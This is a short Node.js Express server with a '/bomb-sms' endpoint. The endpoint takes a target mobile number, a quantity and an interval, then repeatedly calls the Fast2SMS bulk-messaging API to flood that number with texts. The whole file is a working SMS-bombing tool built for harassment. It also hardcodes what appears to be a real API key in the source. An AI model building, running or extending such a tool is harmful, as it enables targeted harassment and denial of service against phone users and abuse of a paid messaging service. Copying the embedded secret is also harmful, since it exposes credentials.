const express = require('express');
const cors = require('cors');
const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());


const API_KEY = 'sZPuJGHNAzEU1kqbV67mgoxjdfrSOW5FiMvYXpLe4yht8BCl2KAP0Y9gUyaCbWIrJ4dfnOVvjh8qT1w2';

app.post('/bomb-sms', (req, res) => {
  const { mobile, quantity, timing } = req.body;

  if (!mobile || !quantity || !timing) {
    return res.status(400).json({ message: 'Incomplete data.' });
  }

  console.log(`Sending ${quantity} SMS to ${mobile} every ${timing} sec`);

  for (let i = 0; i < quantity; i++) {
    setTimeout(() => {
      fetch("https://www.fast2sms.com/dev/bulkV2", {
        method: "POST",
        headers: {
          "authorization": API_KEY,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          variables_values: "Hello%20from%20Fast2SMS", // Jo message bhejna hai
          route: "q",
          numbers: mobile
        })
      })
      .then(res => res.json())
      .then(data => {
        console.log(`SMS ${i + 1} sent to ${mobile}`, data);
      })
      .catch(err => {
        console.error(`Failed to send SMS ${i + 1}`, err);
      });
    }, i * timing * 1000);
  }

  res.json({ message: `Started sending ${quantity} SMS to ${mobile}` });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});